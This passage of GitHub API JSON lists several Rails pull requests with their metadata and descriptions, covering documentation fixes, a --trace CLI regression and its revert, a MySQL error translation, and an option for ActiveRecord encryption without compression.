        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because the documentation is out-of-sync.\r\n\r\n\r\n### Detail\r\n\r\nSince #39164 extension in filename are deprecated (shipped with Rails 6.1)\r\nAnd has been removed in Rails 7.0.\r\n\r\n### Additional information\r\n\r\nN/A\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [N/A] Tests are added or updated if you fix a bug or add a feature.\r\n* [N/A] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50881/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50881/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50880",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50880/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50880/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50880/events",
        "html_url": "https://github.com/rails/rails/pull/50880",
        "id": 2101186217,
        "node_id": "PR_kwDNIULOZRuDOw",
        "number": 50880,
        "title": "Use uniform spacing in 7.1 new framework defaults",
        "user": {
            "login": "Earlopain",
            "id": 14981592,
            "node_id": "MDQ6VXNlcjE0OTgxNTky",
            "avatar_url": "https://avatars.githubusercontent.com/u/14981592?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Earlopain",
            "html_url": "https://github.com/Earlopain",
            "followers_url": "https://api.github.com/users/Earlopain/followers",
            "following_url": "https://api.github.com/users/Earlopain/following{/other_user}",
            "gists_url": "https://api.github.com/users/Earlopain/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Earlopain/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Earlopain/subscriptions",
            "organizations_url": "https://api.github.com/users/Earlopain/orgs",
            "repos_url": "https://api.github.com/users/Earlopain/repos",
            "events_url": "https://api.github.com/users/Earlopain/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Earlopain/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T21:18:24Z",
        "updated_at": "2024-01-25T22:32:09Z",
        "closed_at": "2024-01-25T22:27:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50880",
            "html_url": "https://github.com/rails/rails/pull/50880",
            "diff_url": "https://github.com/rails/rails/pull/50880.diff",
            "patch_url": "https://github.com/rails/rails/pull/50880.patch",
            "merged_at": "2024-01-25T22:27:55Z"
        },
        "body": "Only the last five entries have two newlines between them and I can't see a good reason for that, see #49546.\r\n\r\nIn addition to being inconsistent this trips RuboCop with `Layout/EmptyLines` which is enabled by default.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50880/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50880/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50879",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50879/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50879/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50879/events",
        "html_url": "https://github.com/rails/rails/pull/50879",
        "id": 2101071156,
        "node_id": "PR_kwDNIULOZRn03Q",
        "number": 50879,
        "title": "Transform actionpack documentation to Markdown",
        "user": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T19:53:03Z",
        "updated_at": "2024-02-09T23:14:13Z",
        "closed_at": "2024-02-09T23:14:13Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50879",
            "html_url": "https://github.com/rails/rails/pull/50879",
            "diff_url": "https://github.com/rails/rails/pull/50879.diff",
            "patch_url": "https://github.com/rails/rails/pull/50879.patch",
            "merged_at": "2024-02-09T23:14:13Z"
        },
        "body": "Related to #50759\r\n\r\n`./tools/rdoc-to-md -a --only=actionpack` to reproduce the results.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50879/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50879/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50878",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50878/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50878/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50878/events",
        "html_url": "https://github.com/rails/rails/pull/50878",
        "id": 2100994017,
        "node_id": "PR_kwDNIULOZRjlpA",
        "number": 50878,
        "title": "Revert help on unrecognized bare options",
        "user": {
            "login": "djensenius",
            "id": 782512,
            "node_id": "MDQ6VXNlcjc4MjUxMg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/782512?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djensenius",
            "html_url": "https://github.com/djensenius",
            "followers_url": "https://api.github.com/users/djensenius/followers",
            "following_url": "https://api.github.com/users/djensenius/following{/other_user}",
            "gists_url": "https://api.github.com/users/djensenius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djensenius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djensenius/subscriptions",
            "organizations_url": "https://api.github.com/users/djensenius/orgs",
            "repos_url": "https://api.github.com/users/djensenius/repos",
            "events_url": "https://api.github.com/users/djensenius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djensenius/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T19:01:16Z",
        "updated_at": "2024-01-31T13:43:34Z",
        "closed_at": "2024-01-25T19:36:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50878",
            "html_url": "https://github.com/rails/rails/pull/50878",
            "diff_url": "https://github.com/rails/rails/pull/50878.diff",
            "patch_url": "https://github.com/rails/rails/pull/50878.patch",
            "merged_at": "2024-01-25T19:36:36Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because #50798 created issues when running with --trace.\r\n\r\n### Detail\r\n\r\nThis Pull Request reverts changes in #50798 and adds a test for `--trace` which failed in the aforementioned PR.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\nWe specifically ran into trouble when running `bin/rails --trace db:test:prepare`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50878/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50878/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50877",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50877/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50877/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50877/events",
        "html_url": "https://github.com/rails/rails/pull/50877",
        "id": 2100912709,
        "node_id": "PR_kwDNIULOZRfQYA",
        "number": 50877,
        "title": "Move server shutdown translation to abstract mysql adapter",
        "user": {
            "login": "composerinteralia",
            "id": 13696143,
            "node_id": "MDQ6VXNlcjEzNjk2MTQz",
            "avatar_url": "https://avatars.githubusercontent.com/u/13696143?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/composerinteralia",
            "html_url": "https://github.com/composerinteralia",
            "followers_url": "https://api.github.com/users/composerinteralia/followers",
            "following_url": "https://api.github.com/users/composerinteralia/following{/other_user}",
            "gists_url": "https://api.github.com/users/composerinteralia/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/composerinteralia/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/composerinteralia/subscriptions",
            "organizations_url": "https://api.github.com/users/composerinteralia/orgs",
            "repos_url": "https://api.github.com/users/composerinteralia/repos",
            "events_url": "https://api.github.com/users/composerinteralia/events{/privacy}",
            "received_events_url": "https://api.github.com/users/composerinteralia/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T18:04:43Z",
        "updated_at": "2024-01-25T21:01:53Z",
        "closed_at": "2024-01-25T21:01:53Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50877",
            "html_url": "https://github.com/rails/rails/pull/50877",
            "diff_url": "https://github.com/rails/rails/pull/50877.diff",
            "patch_url": "https://github.com/rails/rails/pull/50877.patch",
            "merged_at": "2024-01-25T21:01:53Z"
        },
        "body": "1053 is the server shutdown error code. We see these fairly often at GitHub when, for example, shutting down Vitess vtage processes for maintenance. Translating the error to `ConnectionFailed` allows us to treat these as retryable connection errors, so we can reconnect and hit a new vtage process.\r\n\r\nThis is all true regardless of whether the adapter is trilogy or mysql2 or whatever, so this commit moves the translation out into the abstract mysql adapter.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50877/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50877/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50876",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50876/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50876/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50876/events",
        "html_url": "https://github.com/rails/rails/pull/50876",
        "id": 2100560122,
        "node_id": "PR_kwDNIULOZRMHVw",
        "number": 50876,
        "title": "Allow encryption without compression",
        "user": {
            "login": "djmb",
            "id": 1734607,
            "node_id": "MDQ6VXNlcjE3MzQ2MDc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1734607?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djmb",
            "html_url": "https://github.com/djmb",
            "followers_url": "https://api.github.com/users/djmb/followers",
            "following_url": "https://api.github.com/users/djmb/following{/other_user}",
            "gists_url": "https://api.github.com/users/djmb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djmb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djmb/subscriptions",
            "organizations_url": "https://api.github.com/users/djmb/orgs",
            "repos_url": "https://api.github.com/users/djmb/repos",
            "events_url": "https://api.github.com/users/djmb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djmb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T14:50:53Z",
        "updated_at": "2024-01-29T19:19:42Z",
        "closed_at": "2024-01-29T19:19:42Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50876",
            "html_url": "https://github.com/rails/rails/pull/50876",
            "diff_url": "https://github.com/rails/rails/pull/50876.diff",
            "patch_url": "https://github.com/rails/rails/pull/50876.patch",
            "merged_at": "2024-01-29T19:19:42Z"
        },
        "body": "### Motivation / Background\r\n\r\nYou may want to avoid compression when using ActiveRecord encryption.\r\n\r\nReasons include\r\n- Your data is already compressed\r\n- Avoiding revealing information about the entropy of the encrypted value (see https://github.blog/2022-10-26-why-and-how-github-encrypts-sensitive-database-columns-using-activerecordencryption/#turn-off-compression-by-default)\r\n\r\n### Detail\r\n\r\nAdd a `compress` option to ActiveRecord::Encryption::Encryptor, which defaults to `true`. When set to `false`, the encryptor will never compress the data.\r\n\r\nThis can be used with the `encryptor` option in the model:\r\n\r\n```ruby\r\nclass Record < ApplicationRecord\r\n  encrypts :field, encryptor: ActiveRecord::Encryption::Encryptor.new(compress: false)\r\nend\r\n```\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50876/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50876/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50875",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50875/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50875/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50875/events",
        "html_url": "https://github.com/rails/rails/pull/50875",
        "id": 2100558202,
        "node_id": "PR_kwDNIULOZRMAtQ",
        "number": 50875,
        "title": "Allow `--trace` to be first command when running `bin/rails`",
        "user": {
            "login": "djensenius",
            "id": 782512,
            "node_id": "MDQ6VXNlcjc4MjUxMg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/782512?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djensenius",
            "html_url": "https://github.com/djensenius",
            "followers_url": "https://api.github.com/users/djensenius/followers",
            "following_url": "https://api.github.com/users/djensenius/following{/other_user}",
            "gists_url": "https://api.github.com/users/djensenius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djensenius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djensenius/subscriptions",
            "organizations_url": "https://api.github.com/users/djensenius/orgs",
            "repos_url": "https://api.github.com/users/djensenius/repos",
            "events_url": "https://api.github.com/users/djensenius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djensenius/received_events",
            "type": "User",
            "site_admin": true
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-25T14:49:52Z",
        "updated_at": "2024-01-25T17:39:34Z",
        "closed_at": "2024-01-25T17:39:34Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50875",
            "html_url": "https://github.com/rails/rails/pull/50875",
            "diff_url": "https://github.com/rails/rails/pull/50875.diff",
            "patch_url": "https://github.com/rails/rails/pull/50875.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nA recent PR (https://github.com/rails/rails/pull/50798) contains a bug where if `--trace` is used as the first argument a help screen is shown. This breaks existing allowed practices.\r\n\r\nThis PR allows `--trace` to be used.\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\n\r\n### Detail\r\n\r\nThis Pull Request changes one of the checks to explicitly allow [command line options](https://github.com/ruby/rake/blob/523931170f7a2a8271aac9761287e505e6a9a32c/doc/command_line_usage.rdoc#L19) to work.\r\n\r\nAnother option would be to roll back #50798 \r\n\r\n### Additional information\r\n\r\ncc @jonathanhefner who made the original PR\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50875/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50875/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50874",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50874/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50874/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50874/events",
        "html_url": "https://github.com/rails/rails/pull/50874",
        "id": 2100552035,
        "node_id": "PR_kwDNIULOZRLrcg",
        "number": 50874,
        "title": "docs: correct fixed-width font documentation",
        "user": {
            "login": "Uaitt",
            "id": 97030518,
            "node_id": "U_kgDOBciRdg",
            "avatar_url": "https://avatars.githubusercontent.com/u/97030518?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Uaitt",
            "html_url": "https://github.com/Uaitt",
            "followers_url": "https://api.github.com/users/Uaitt/followers",
            "following_url": "https://api.github.com/users/Uaitt/following{/other_user}",
            "gists_url": "https://api.github.com/users/Uaitt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Uaitt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Uaitt/subscriptions",
            "organizations_url": "https://api.github.com/users/Uaitt/orgs",
            "repos_url": "https://api.github.com/users/Uaitt/repos",
            "events_url": "https://api.github.com/users/Uaitt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Uaitt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-25T14:46:40Z",
        "updated_at": "2024-01-26T07:50:08Z",
        "closed_at": "2024-01-25T19:20:10Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50874",
            "html_url": "https://github.com/rails/rails/pull/50874",
            "diff_url": "https://github.com/rails/rails/pull/50874.diff",
            "patch_url": "https://github.com/rails/rails/pull/50874.patch",
            "merged_at": "2024-01-25T19:20:10Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Detail\r\n\r\nThis Pull Request corrects some fixed-width font documentation of the `ActiveJob::Exceptions` module.\r\n\r\n<img width=\"1127\" alt=\"Screenshot 2024-01-25 at 15 40 32\" src=\"https://github.com/rails/rails/assets/97030518/f61fd253-5825-4890-a107-5347769b0c58\">\r\n\r\n<img width=\"1127\" alt=\"Screenshot 2024-01-25 at 15 40 19\" src=\"https://github.com/rails/rails/assets/97030518/00dbfeb8-4cfe-4e12-b0b9-2b4bbded1cf4\">\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50874/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50874/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50873",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50873/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50873/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50873/events",
        "html_url": "https://github.com/rails/rails/pull/50873",
        "id": 2100413008,
        "node_id": "PR_kwDNIULOZREGFA",
        "number": 50873,
        "title": "dump schema: ignore tables from any postgres schema",
        "user": {
            "login": "gagalago",
            "id": 519226,
            "node_id": "MDQ6VXNlcjUxOTIyNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/519226?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gagalago",
            "html_url": "https://github.com/gagalago",
            "followers_url": "https://api.github.com/users/gagalago/followers",
            "following_url": "https://api.github.com/users/gagalago/following{/other_user}",
            "gists_url": "https://api.github.com/users/gagalago/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gagalago/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gagalago/subscriptions",
            "organizations_url": "https://api.github.com/users/gagalago/orgs",
            "repos_url": "https://api.github.com/users/gagalago/repos",
            "events_url": "https://api.github.com/users/gagalago/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gagalago/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-25T13:31:52Z",
        "updated_at": "2024-01-25T13:41:01Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50873",
            "html_url": "https://github.com/rails/rails/pull/50873",
            "diff_url": "https://github.com/rails/rails/pull/50873.diff",
            "patch_url": "https://github.com/rails/rails/pull/50873.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nthis pull request improve the current implementation of ignoring table during the schema dump by allowing to ignore tables from other postgres schema than \"public\".\r\n\r\n### Detail\r\n\r\nThis Pull Request changes [REPLACE ME]\r\n\r\n### Additional information\r\n\r\nthe proposed implementation lack the ability to specify exactly from which schema, the table is ignored but I think that even do, it's better than the current implementation.\r\n\r\n- [pg_dump documentation](https://www.postgresql.org/docs/current/app-pgdump.html)\r\n- [pattern documentation](https://www.postgresql.org/docs/current/app-psql.html#APP-PSQL-PATTERNS\r\n\r\n### Checklist\r\n\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\nI feel that the code change is too small to request updating CHANGELOG or writing new tests",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50873/reactions",
            "total_count": 0,
            "+1": 0,
